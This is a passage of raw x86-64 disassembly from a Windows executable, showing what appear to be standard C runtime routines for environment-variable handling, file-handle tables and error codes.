   140007fb4:	74 0f                	je     0x140007fc5
   140007fb6:	41 38 34 04          	cmp    %sil,(%r12,%rax,1)
   140007fba:	74 09                	je     0x140007fc5
   140007fbc:	48 83 c3 08          	add    $0x8,%rbx
   140007fc0:	48 8b 03             	mov    (%rbx),%rax
   140007fc3:	eb d0                	jmp    0x140007f95
   140007fc5:	49 2b de             	sub    %r14,%rbx
   140007fc8:	48 c1 fb 03          	sar    $0x3,%rbx
   140007fcc:	eb 0a                	jmp    0x140007fd8
   140007fce:	49 2b de             	sub    %r14,%rbx
   140007fd1:	48 c1 fb 03          	sar    $0x3,%rbx
   140007fd5:	48 f7 db             	neg    %rbx
   140007fd8:	48 85 db             	test   %rbx,%rbx
   140007fdb:	78 57                	js     0x140008034
   140007fdd:	49 39 36             	cmp    %rsi,(%r14)
   140007fe0:	74 52                	je     0x140008034
   140007fe2:	49 8b 0c de          	mov    (%r14,%rbx,8),%rcx
   140007fe6:	e8 e9 d7 ff ff       	call   0x1400057d4
   140007feb:	40 84 ed             	test   %bpl,%bpl
   140007fee:	74 15                	je     0x140008005
   140007ff0:	4d 89 3c de          	mov    %r15,(%r14,%rbx,8)
   140007ff4:	e9 95 00 00 00       	jmp    0x14000808e
   140007ff9:	49 8b 44 de 08       	mov    0x8(%r14,%rbx,8),%rax
   140007ffe:	49 89 04 de          	mov    %rax,(%r14,%rbx,8)
   140008002:	48 ff c3             	inc    %rbx
   140008005:	49 39 34 de          	cmp    %rsi,(%r14,%rbx,8)
   140008009:	75 ee                	jne    0x140007ff9
   14000800b:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140008011:	48 8b d3             	mov    %rbx,%rdx
   140008014:	49 8b ce             	mov    %r14,%rcx
   140008017:	e8 d0 fb ff ff       	call   0x140007bec
   14000801c:	33 c9                	xor    %ecx,%ecx
   14000801e:	48 8b d8             	mov    %rax,%rbx
   140008021:	e8 ae d7 ff ff       	call   0x1400057d4
   140008026:	48 85 db             	test   %rbx,%rbx
   140008029:	74 66                	je     0x140008091
   14000802b:	48 89 1d 86 01 01 00 	mov    %rbx,0x10186(%rip)        # 0x1400181b8
   140008032:	eb 5d                	jmp    0x140008091
   140008034:	40 84 ed             	test   %bpl,%bpl
   140008037:	0f 84 e8 00 00 00    	je     0x140008125
   14000803d:	48 f7 db             	neg    %rbx
   140008040:	48 8d 53 02          	lea    0x2(%rbx),%rdx
   140008044:	48 3b d3             	cmp    %rbx,%rdx
   140008047:	73 09                	jae    0x140008052
   140008049:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   14000804d:	e9 d5 00 00 00       	jmp    0x140008127
   140008052:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   140008059:	ff ff 1f 
   14000805c:	48 3b d0             	cmp    %rax,%rdx
   14000805f:	73 e8                	jae    0x140008049
   140008061:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140008067:	49 8b ce             	mov    %r14,%rcx
   14000806a:	e8 7d fb ff ff       	call   0x140007bec
   14000806f:	33 c9                	xor    %ecx,%ecx
   140008071:	4c 8b f0             	mov    %rax,%r14
   140008074:	e8 5b d7 ff ff       	call   0x1400057d4
   140008079:	4d 85 f6             	test   %r14,%r14
   14000807c:	74 cb                	je     0x140008049
   14000807e:	4d 89 3c de          	mov    %r15,(%r14,%rbx,8)
   140008082:	49 89 74 de 08       	mov    %rsi,0x8(%r14,%rbx,8)
   140008087:	4c 89 35 2a 01 01 00 	mov    %r14,0x1012a(%rip)        # 0x1400181b8
   14000808e:	48 8b fe             	mov    %rsi,%rdi
   140008091:	39 74 24 78          	cmp    %esi,0x78(%rsp)
   140008095:	0f 84 8e 00 00 00    	je     0x140008129
   14000809b:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   14000809f:	4c 8b f5             	mov    %rbp,%r14
   1400080a2:	49 ff c6             	inc    %r14
   1400080a5:	43 38 34 37          	cmp    %sil,(%r15,%r14,1)
   1400080a9:	75 f7                	jne    0x1400080a2
   1400080ab:	ba 01 00 00 00       	mov    $0x1,%edx
   1400080b0:	49 8d 4e 02          	lea    0x2(%r14),%rcx
   1400080b4:	e8 5f e6 ff ff       	call   0x140006718
   1400080b9:	48 8b d8             	mov    %rax,%rbx
   1400080bc:	48 85 c0             	test   %rax,%rax
   1400080bf:	74 47                	je     0x140008108
   1400080c1:	4d 8b c7             	mov    %r15,%r8
   1400080c4:	49 8d 56 02          	lea    0x2(%r14),%rdx
   1400080c8:	48 8b c8             	mov    %rax,%rcx
   1400080cb:	e8 50 bb ff ff       	call   0x140003c20
   1400080d0:	85 c0                	test   %eax,%eax
   1400080d2:	75 77                	jne    0x14000814b
   1400080d4:	48 8b c3             	mov    %rbx,%rax
   1400080d7:	49 8d 4d 01          	lea    0x1(%r13),%rcx
   1400080db:	49 2b c7             	sub    %r15,%rax
   1400080de:	48 03 c8             	add    %rax,%rcx
   1400080e1:	f6 5c 24 70          	negb   0x70(%rsp)
   1400080e5:	48 1b d2             	sbb    %rdx,%rdx
   1400080e8:	48 23 d1             	and    %rcx,%rdx
   1400080eb:	40 88 71 ff          	mov    %sil,-0x1(%rcx)
   1400080ef:	48 8b cb             	mov    %rbx,%rcx
   1400080f2:	e8 fd 2e 00 00       	call   0x14000aff4
   1400080f7:	85 c0                	test   %eax,%eax
   1400080f9:	75 0d                	jne    0x140008108
   1400080fb:	e8 fc e1 ff ff       	call   0x1400062fc
   140008100:	8b f5                	mov    %ebp,%esi
   140008102:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140008108:	48 8b cb             	mov    %rbx,%rcx
   14000810b:	e8 c4 d6 ff ff       	call   0x1400057d4
   140008110:	eb 17                	jmp    0x140008129
   140008112:	e8 e5 e1 ff ff       	call   0x1400062fc
   140008117:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   14000811b:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008121:	8b ee                	mov    %esi,%ebp
   140008123:	8b f5                	mov    %ebp,%esi
   140008125:	8b ee                	mov    %esi,%ebp
   140008127:	8b f5                	mov    %ebp,%esi
   140008129:	48 8b cf             	mov    %rdi,%rcx
   14000812c:	e8 a3 d6 ff ff       	call   0x1400057d4
   140008131:	8b c6                	mov    %esi,%eax
   140008133:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   14000813a:	00 
   14000813b:	48 83 c4 30          	add    $0x30,%rsp
   14000813f:	41 5f                	pop    %r15
   140008141:	41 5e                	pop    %r14
   140008143:	41 5d                	pop    %r13
   140008145:	41 5c                	pop    %r12
   140008147:	5f                   	pop    %rdi
   140008148:	5e                   	pop    %rsi
   140008149:	5d                   	pop    %rbp
   14000814a:	c3                   	ret
   14000814b:	45 33 c9             	xor    %r9d,%r9d
   14000814e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140008153:	45 33 c0             	xor    %r8d,%r8d
   140008156:	33 d2                	xor    %edx,%edx
   140008158:	33 c9                	xor    %ecx,%ecx
   14000815a:	e8 91 d7 ff ff       	call   0x1400058f0
   14000815f:	cc                   	int3
   140008160:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008165:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000816a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000816f:	41 56                	push   %r14
   140008171:	48 83 ec 30          	sub    $0x30,%rsp
   140008175:	48 8b f9             	mov    %rcx,%rdi
   140008178:	48 85 c9             	test   %rcx,%rcx
   14000817b:	75 18                	jne    0x140008195
   14000817d:	33 c0                	xor    %eax,%eax
   14000817f:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140008184:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140008189:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   14000818e:	48 83 c4 30          	add    $0x30,%rsp
   140008192:	41 5e                	pop    %r14
   140008194:	c3                   	ret
   140008195:	33 c9                	xor    %ecx,%ecx
   140008197:	48 8b c7             	mov    %rdi,%rax
   14000819a:	48 39 0f             	cmp    %rcx,(%rdi)
   14000819d:	74 0d                	je     0x1400081ac
   14000819f:	48 ff c1             	inc    %rcx
   1400081a2:	48 8d 40 08          	lea    0x8(%rax),%rax
   1400081a6:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400081aa:	75 f3                	jne    0x14000819f
   1400081ac:	48 ff c1             	inc    %rcx
   1400081af:	ba 08 00 00 00       	mov    $0x8,%edx
   1400081b4:	e8 5f e5 ff ff       	call   0x140006718
   1400081b9:	48 8b d8             	mov    %rax,%rbx
   1400081bc:	48 85 c0             	test   %rax,%rax
   1400081bf:	74 7e                	je     0x14000823f
   1400081c1:	48 8b 07             	mov    (%rdi),%rax
   1400081c4:	48 85 c0             	test   %rax,%rax
   1400081c7:	74 51                	je     0x14000821a
   1400081c9:	4c 8b f3             	mov    %rbx,%r14
   1400081cc:	4c 2b f7             	sub    %rdi,%r14
   1400081cf:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   1400081d3:	48 ff c6             	inc    %rsi
   1400081d6:	80 3c 30 00          	cmpb   $0x0,(%rax,%rsi,1)
   1400081da:	75 f7                	jne    0x1400081d3
   1400081dc:	ba 01 00 00 00       	mov    $0x1,%edx
   1400081e1:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   1400081e5:	e8 2e e5 ff ff       	call   0x140006718
   1400081ea:	33 c9                	xor    %ecx,%ecx
   1400081ec:	49 89 04 3e          	mov    %rax,(%r14,%rdi,1)
   1400081f0:	e8 df d5 ff ff       	call   0x1400057d4
   1400081f5:	49 8b 0c 3e          	mov    (%r14,%rdi,1),%rcx
   1400081f9:	48 85 c9             	test   %rcx,%rcx
   1400081fc:	74 41                	je     0x14000823f
   1400081fe:	4c 8b 07             	mov    (%rdi),%r8
   140008201:	48 8d 56 01          	lea    0x1(%rsi),%rdx
   140008205:	e8 16 ba ff ff       	call   0x140003c20
   14000820a:	85 c0                	test   %eax,%eax
   14000820c:	75 1b                	jne    0x140008229
   14000820e:	48 83 c7 08          	add    $0x8,%rdi
   140008212:	48 8b 07             	mov    (%rdi),%rax
   140008215:	48 85 c0             	test   %rax,%rax
   140008218:	75 b5                	jne    0x1400081cf
   14000821a:	33 c9                	xor    %ecx,%ecx
   14000821c:	e8 b3 d5 ff ff       	call   0x1400057d4
   140008221:	48 8b c3             	mov    %rbx,%rax
   140008224:	e9 56 ff ff ff       	jmp    0x14000817f
   140008229:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000822f:	45 33 c9             	xor    %r9d,%r9d
   140008232:	45 33 c0             	xor    %r8d,%r8d
   140008235:	33 d2                	xor    %edx,%edx
   140008237:	33 c9                	xor    %ecx,%ecx
   140008239:	e8 b2 d6 ff ff       	call   0x1400058f0
   14000823e:	cc                   	int3
   14000823f:	e8 08 b8 ff ff       	call   0x140003a4c
   140008244:	cc                   	int3
   140008245:	cc                   	int3
   140008246:	cc                   	int3
   140008247:	cc                   	int3
   140008248:	48 83 ec 28          	sub    $0x28,%rsp
   14000824c:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   14000824f:	75 15                	jne    0x140008266
   140008251:	e8 c6 e0 ff ff       	call   0x14000631c
   140008256:	83 20 00             	andl   $0x0,(%rax)
   140008259:	e8 9e e0 ff ff       	call   0x1400062fc
   14000825e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008264:	eb 4e                	jmp    0x1400082b4
   140008266:	85 c9                	test   %ecx,%ecx
   140008268:	78 32                	js     0x14000829c
   14000826a:	3b 0d 80 08 01 00    	cmp    0x10880(%rip),%ecx        # 0x140018af0
   140008270:	73 2a                	jae    0x14000829c
   140008272:	48 63 c9             	movslq %ecx,%rcx
   140008275:	4c 8d 05 74 04 01 00 	lea    0x10474(%rip),%r8        # 0x1400186f0
   14000827c:	48 8b c1             	mov    %rcx,%rax
   14000827f:	83 e1 3f             	and    $0x3f,%ecx
   140008282:	48 c1 f8 06          	sar    $0x6,%rax
   140008286:	48 8d 14 c9          	lea    (%rcx,%rcx,8),%rdx
   14000828a:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000828e:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   140008293:	74 07                	je     0x14000829c
   140008295:	48 8b 44 d0 28       	mov    0x28(%rax,%rdx,8),%rax
   14000829a:	eb 1c                	jmp    0x1400082b8
   14000829c:	e8 7b e0 ff ff       	call   0x14000631c
   1400082a1:	83 20 00             	andl   $0x0,(%rax)
   1400082a4:	e8 53 e0 ff ff       	call   0x1400062fc
   1400082a9:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400082af:	e8 1c d6 ff ff       	call   0x1400058d0
   1400082b4:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400082b8:	48 83 c4 28          	add    $0x28,%rsp
   1400082bc:	c3                   	ret
   1400082bd:	cc                   	int3
   1400082be:	cc                   	int3
   1400082bf:	cc                   	int3
   1400082c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400082c5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400082ca:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400082cf:	41 56                	push   %r14
   1400082d1:	48 83 ec 20          	sub    $0x20,%rsp
   1400082d5:	48 63 d9             	movslq %ecx,%rbx
   1400082d8:	85 c9                	test   %ecx,%ecx
   1400082da:	78 72                	js     0x14000834e
   1400082dc:	3b 1d 0e 08 01 00    	cmp    0x1080e(%rip),%ebx        # 0x140018af0
   1400082e2:	73 6a                	jae    0x14000834e
   1400082e4:	48 8b c3             	mov    %rbx,%rax
   1400082e7:	4c 8d 35 02 04 01 00 	lea    0x10402(%rip),%r14        # 0x1400186f0
   1400082ee:	83 e0 3f             	and    $0x3f,%eax
   1400082f1:	48 8b f3             	mov    %rbx,%rsi
   1400082f4:	48 c1 fe 06          	sar    $0x6,%rsi
   1400082f8:	48 8d 3c c0          	lea    (%rax,%rax,8),%rdi
   1400082fc:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140008300:	f6 44 f8 38 01       	testb  $0x1,0x38(%rax,%rdi,8)
   140008305:	74 47                	je     0x14000834e
   140008307:	48 83 7c f8 28 ff    	cmpq   $0xffffffffffffffff,0x28(%rax,%rdi,8)
   14000830d:	74 3f                	je     0x14000834e
   14000830f:	e8 40 b5 ff ff       	call   0x140003854
   140008314:	83 f8 01             	cmp    $0x1,%eax
   140008317:	75 27                	jne    0x140008340
   140008319:	85 db                	test   %ebx,%ebx
   14000831b:	74 16                	je     0x140008333
   14000831d:	2b d8                	sub    %eax,%ebx
   14000831f:	74 0b                	je     0x14000832c
   140008321:	3b d8                	cmp    %eax,%ebx
   140008323:	75 1b                	jne    0x140008340
   140008325:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   14000832a:	eb 0c                	jmp    0x140008338
   14000832c:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140008331:	eb 05                	jmp    0x140008338
   140008333:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140008338:	33 d2                	xor    %edx,%edx
   14000833a:	ff 15 d0 d5 00 00    	call   *0xd5d0(%rip)        # 0x140015910
   140008340:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140008344:	48 83 4c f8 28 ff    	orq    $0xffffffffffffffff,0x28(%rax,%rdi,8)
   14000834a:	33 c0                	xor    %eax,%eax
   14000834c:	eb 16                	jmp    0x140008364
   14000834e:	e8 a9 df ff ff       	call   0x1400062fc
   140008353:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008359:	e8 be df ff ff       	call   0x14000631c
   14000835e:	83 20 00             	andl   $0x0,(%rax)
   140008361:	83 c8 ff             	or     $0xffffffff,%eax
   140008364:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008369:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000836e:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140008373:	48 83 c4 20          	add    $0x20,%rsp
   140008377:	41 5e                	pop    %r14
   140008379:	c3                   	ret
   14000837a:	cc                   	int3
   14000837b:	cc                   	int3
   14000837c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008381:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008386:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000838b:	57                   	push   %rdi
   14000838c:	48 83 ec 20          	sub    $0x20,%rsp
   140008390:	ba 48 00 00 00       	mov    $0x48,%edx
   140008395:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   140008398:	e8 7b e3 ff ff       	call   0x140006718
   14000839d:	33 f6                	xor    %esi,%esi
   14000839f:	48 8b d8             	mov    %rax,%rbx
   1400083a2:	48 85 c0             	test   %rax,%rax
   1400083a5:	74 5b                	je     0x140008402
   1400083a7:	48 8d a8 00 12 00 00 	lea    0x1200(%rax),%rbp
   1400083ae:	48 3b c5             	cmp    %rbp,%rax
   1400083b1:	74 4c                	je     0x1400083ff
   1400083b3:	48 8d 78 30          	lea    0x30(%rax),%rdi
   1400083b7:	48 8d 4f d0          	lea    -0x30(%rdi),%rcx
   1400083bb:	45 33 c0             	xor    %r8d,%r8d
   1400083be:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1400083c3:	e8 e0 bb ff ff       	call   0x140003fa8
   1400083c8:	48 83 4f f8 ff       	orq    $0xffffffffffffffff,-0x8(%rdi)
   1400083cd:	48 8d 4f 0e          	lea    0xe(%rdi),%rcx
   1400083d1:	80 67 0d f8          	andb   $0xf8,0xd(%rdi)
   1400083d5:	8b c6                	mov    %esi,%eax
   1400083d7:	48 89 37             	mov    %rsi,(%rdi)
   1400083da:	c7 47 08 00 00 0a 0a 	movl   $0xa0a0000,0x8(%rdi)
   1400083e1:	c6 47 0c 0a          	movb   $0xa,0xc(%rdi)
   1400083e5:	40 88 31             	mov    %sil,(%rcx)
   1400083e8:	ff c0                	inc    %eax
   1400083ea:	48 ff c1             	inc    %rcx
   1400083ed:	83 f8 05             	cmp    $0x5,%eax
   1400083f0:	72 f3                	jb     0x1400083e5
   1400083f2:	48 83 c7 48          	add    $0x48,%rdi
   1400083f6:	48 8d 47 d0          	lea    -0x30(%rdi),%rax
   1400083fa:	48 3b c5             	cmp    %rbp,%rax
   1400083fd:	75 b8                	jne    0x1400083b7
   1400083ff:	48 8b f3             	mov    %rbx,%rsi
   140008402:	33 c9                	xor    %ecx,%ecx
   140008404:	e8 cb d3 ff ff       	call   0x1400057d4
   140008409:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000840e:	48 8b c6             	mov    %rsi,%rax
   140008411:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008416:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000841b:	48 83 c4 20          	add    $0x20,%rsp
   14000841f:	5f                   	pop    %rdi
   140008420:	c3                   	ret
   140008421:	cc                   	int3
   140008422:	cc                   	int3
   140008423:	cc                   	int3
   140008424:	48 85 c9             	test   %rcx,%rcx
   140008427:	74 4a                	je     0x140008473
   140008429:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000842e:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008433:	57                   	push   %rdi
   140008434:	48 83 ec 20          	sub    $0x20,%rsp
   140008438:	48 8d b1 00 12 00 00 	lea    0x1200(%rcx),%rsi
   14000843f:	48 8b d9             	mov    %rcx,%rbx
   140008442:	48 8b f9             	mov    %rcx,%rdi
   140008445:	48 3b ce             	cmp    %rsi,%rcx
   140008448:	74 12                	je     0x14000845c
   14000844a:	48 8b cf             	mov    %rdi,%rcx
   14000844d:	ff 15 15 d3 00 00    	call   *0xd315(%rip)        # 0x140015768
   140008453:	48 83 c7 48          	add    $0x48,%rdi
   140008457:	48 3b fe             	cmp    %rsi,%rdi
   14000845a:	75 ee                	jne    0x14000844a
   14000845c:	48 8b cb             	mov    %rbx,%rcx
   14000845f:	e8 70 d3 ff ff       	call   0x1400057d4
   140008464:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008469:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000846e:	48 83 c4 20          	add    $0x20,%rsp
   140008472:	5f                   	pop    %rdi
   140008473:	c3                   	ret
   140008474:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008479:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000847e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140008483:	41 57                	push   %r15
   140008485:	48 83 ec 30          	sub    $0x30,%rsp
   140008489:	8b f1                	mov    %ecx,%esi
   14000848b:	81 f9 00 20 00 00    	cmp    $0x2000,%ecx
   140008491:	72 29                	jb     0x1400084bc
   140008493:	e8 64 de ff ff       	call   0x1400062fc
   140008498:	bb 09 00 00 00       	mov    $0x9,%ebx
   14000849d:	89 18                	mov    %ebx,(%rax)
   14000849f:	e8 2c d4 ff ff       	call   0x1400058d0
   1400084a4:	8b c3                	mov    %ebx,%eax
   1400084a6:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400084ab:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400084b0:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400084b5:	48 83 c4 30          	add    $0x30,%rsp
   1400084b9:	41 5f                	pop    %r15
   1400084bb:	c3                   	ret
   1400084bc:	33 ff                	xor    %edi,%edi
   1400084be:	8d 4f 07             	lea    0x7(%rdi),%ecx
   1400084c1:	e8 1a bf ff ff       	call   0x1400043e0
   1400084c6:	90                   	nop
   1400084c7:	8b df                	mov    %edi,%ebx
   1400084c9:	8b 05 21 06 01 00    	mov    0x10621(%rip),%eax        # 0x140018af0
   1400084cf:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400084d4:	3b f0                	cmp    %eax,%esi
   1400084d6:	7c 36                	jl     0x14000850e
   1400084d8:	4c 8d 3d 11 02 01 00 	lea    0x10211(%rip),%r15        # 0x1400186f0
   1400084df:	49 39 3c df          	cmp    %rdi,(%r15,%rbx,8)
   1400084e3:	74 02                	je     0x1400084e7
   1400084e5:	eb 22                	jmp    0x140008509
   1400084e7:	e8 90 fe ff ff       	call   0x14000837c
   1400084ec:	49 89 04 df          	mov    %rax,(%r15,%rbx,8)
   1400084f0:	48 85 c0             	test   %rax,%rax
   1400084f3:	75 05                	jne    0x1400084fa
   1400084f5:	8d 78 0c             	lea    0xc(%rax),%edi
   1400084f8:	eb 14                	jmp    0x14000850e
   1400084fa:	8b 05 f0 05 01 00    	mov    0x105f0(%rip),%eax        # 0x140018af0
   140008500:	83 c0 40             	add    $0x40,%eax
   140008503:	89 05 e7 05 01 00    	mov    %eax,0x105e7(%rip)        # 0x140018af0
   140008509:	48 ff c3             	inc    %rbx
   14000850c:	eb c1                	jmp    0x1400084cf
   14000850e:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008513:	e8 e4 be ff ff       	call   0x1400043fc
   140008518:	8b c7                	mov    %edi,%eax
   14000851a:	eb 8a                	jmp    0x1400084a6
   14000851c:	48 63 d1             	movslq %ecx,%rdx
   14000851f:	4c 8d 05 ca 01 01 00 	lea    0x101ca(%rip),%r8        # 0x1400186f0
   140008526:	48 8b c2             	mov    %rdx,%rax
   140008529:	83 e2 3f             	and    $0x3f,%edx
   14000852c:	48 c1 f8 06          	sar    $0x6,%rax
   140008530:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140008534:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140008538:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   14000853c:	48 ff 25 2d d2 00 00 	rex.W jmp *0xd22d(%rip)        # 0x140015770
   140008543:	cc                   	int3
   140008544:	48 63 d1             	movslq %ecx,%rdx
   140008547:	4c 8d 05 a2 01 01 00 	lea    0x101a2(%rip),%r8        # 0x1400186f0
   14000854e:	48 8b c2             	mov    %rdx,%rax
   140008551:	83 e2 3f             	and    $0x3f,%edx
   140008554:	48 c1 f8 06          	sar    $0x6,%rax
   140008558:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   14000855c:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140008560:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140008564:	48 ff 25 45 d3 00 00 	rex.W jmp *0xd345(%rip)        # 0x1400158b0
   14000856b:	cc                   	int3
   14000856c:	8b 05 06 06 01 00    	mov    0x10606(%rip),%eax        # 0x140018b78
   140008572:	b9 00 40 00 00       	mov    $0x4000,%ecx
   140008577:	85 c0                	test   %eax,%eax
   140008579:	0f 44 c1             	cmove  %ecx,%eax
   14000857c:	89 05 f6 05 01 00    	mov    %eax,0x105f6(%rip)        # 0x140018b78
   140008582:	33 c0                	xor    %eax,%eax
   140008584:	c3                   	ret
   140008585:	cc                   	int3
   140008586:	cc                   	int3
   140008587:	cc                   	int3
   140008588:	e9 8b e1 ff ff       	jmp    0x140006718
   14000858d:	cc                   	int3
   14000858e:	cc                   	int3
   14000858f:	cc                   	int3
   140008590:	40 53                	rex push %rbx
   140008592:	48 83 ec 20          	sub    $0x20,%rsp
   140008596:	48 8b d9             	mov    %rcx,%rbx
   140008599:	4c 8d 0d 10 70 00 00 	lea    0x7010(%rip),%r9        # 0x14000f5b0
   1400085a0:	33 c9                	xor    %ecx,%ecx
   1400085a2:	4c 8d 05 ff 6f 00 00 	lea    0x6fff(%rip),%r8        # 0x14000f5a8
   1400085a9:	48 8d 15 a8 ac 00 00 	lea    0xaca8(%rip),%rdx        # 0x140013258
   1400085b0:	e8 6b 01 00 00       	call   0x140008720
   1400085b5:	48 85 c0             	test   %rax,%rax
   1400085b8:	74 0f                	je     0x1400085c9
   1400085ba:	48 8b cb             	mov    %rbx,%rcx
   1400085bd:	48 83 c4 20          	add    $0x20,%rsp
   1400085c1:	5b                   	pop    %rbx
   1400085c2:	48 ff 25 47 1a 01 00 	rex.W jmp *0x11a47(%rip)        # 0x14001a010
   1400085c9:	48 83 c4 20          	add    $0x20,%rsp
   1400085cd:	5b                   	pop    %rbx
   1400085ce:	48 ff 25 53 d3 00 00 	rex.W jmp *0xd353(%rip)        # 0x140015928
   1400085d5:	cc                   	int3
   1400085d6:	cc                   	int3
   1400085d7:	cc                   	int3
   1400085d8:	40 53                	rex push %rbx
   1400085da:	48 83 ec 20          	sub    $0x20,%rsp
   1400085de:	8b d9                	mov    %ecx,%ebx
   1400085e0:	4c 8d 0d d1 6f 00 00 	lea    0x6fd1(%rip),%r9        # 0x14000f5b8
   1400085e7:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400085ec:	4c 8d 05 bd 6f 00 00 	lea    0x6fbd(%rip),%r8        # 0x14000f5b0
   1400085f3:	48 8d 15 1e ac 00 00 	lea    0xac1e(%rip),%rdx        # 0x140013218
   1400085fa:	e8 21 01 00 00       	call   0x140008720
   1400085ff:	8b cb                	mov    %ebx,%ecx
   140008601:	48 85 c0             	test   %rax,%rax
   140008604:	74 0c                	je     0x140008612
   140008606:	48 83 c4 20          	add    $0x20,%rsp
   14000860a:	5b                   	pop    %rbx
   14000860b:	48 ff 25 fe 19 01 00 	rex.W jmp *0x119fe(%rip)        # 0x14001a010
   140008612:	48 83 c4 20          	add    $0x20,%rsp
   140008616:	5b                   	pop    %rbx
   140008617:	48 ff 25 12 d3 00 00 	rex.W jmp *0xd312(%rip)        # 0x140015930
   14000861e:	cc                   	int3
   14000861f:	cc                   	int3
   140008620:	40 53                	rex push %rbx
   140008622:	48 83 ec 20          	sub    $0x20,%rsp
   140008626:	8b d9                	mov    %ecx,%ebx
   140008628:	4c 8d 0d 91 6f 00 00 	lea    0x6f91(%rip),%r9        # 0x14000f5c0
   14000862f:	b9 02 00 00 00       	mov    $0x2,%ecx
   140008634:	4c 8d 05 7d 6f 00 00 	lea    0x6f7d(%rip),%r8        # 0x14000f5b8
   14000863b:	48 8d 15 be ab 00 00 	lea    0xabbe(%rip),%rdx        # 0x140013200
   140008642:	e8 d9 00 00 00       	call   0x140008720
   140008647:	8b cb                	mov    %ebx,%ecx
   140008649:	48 85 c0             	test   %rax,%rax
   14000864c:	74 0c                	je     0x14000865a
   14000864e:	48 83 c4 20          	add    $0x20,%rsp
   140008652:	5b                   	pop    %rbx
   140008653:	48 ff 25 b6 19 01 00 	rex.W jmp *0x119b6(%rip)        # 0x14001a010
   14000865a:	48 83 c4 20          	add    $0x20,%rsp
   14000865e:	5b                   	pop    %rbx
   14000865f:	48 ff 25 d2 d2 00 00 	rex.W jmp *0xd2d2(%rip)        # 0x140015938
   140008666:	cc                   	int3
   140008667:	cc                   	int3
   140008668:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000866d:	57                   	push   %rdi
   14000866e:	48 83 ec 20          	sub    $0x20,%rsp
   140008672:	48 8b da             	mov    %rdx,%rbx
   140008675:	4c 8d 0d 4c 6f 00 00 	lea    0x6f4c(%rip),%r9        # 0x14000f5c8
   14000867c:	8b f9                	mov    %ecx,%edi
   14000867e:	48 8d 15 6b ab 00 00 	lea    0xab6b(%rip),%rdx        # 0x1400131f0
   140008685:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000868a:	4c 8d 05 2f 6f 00 00 	lea    0x6f2f(%rip),%r8        # 0x14000f5c0
   140008691:	e8 8a 00 00 00       	call   0x140008720
   140008696:	48 8b d3             	mov    %rbx,%rdx
   140008699:	8b cf                	mov    %edi,%ecx
   14000869b:	48 85 c0             	test   %rax,%rax
   14000869e:	74 08                	je     0x1400086a8
   1400086a0:	ff 15 6a 19 01 00    	call   *0x1196a(%rip)        # 0x14001a010
   1400086a6:	eb 06                	jmp    0x1400086ae
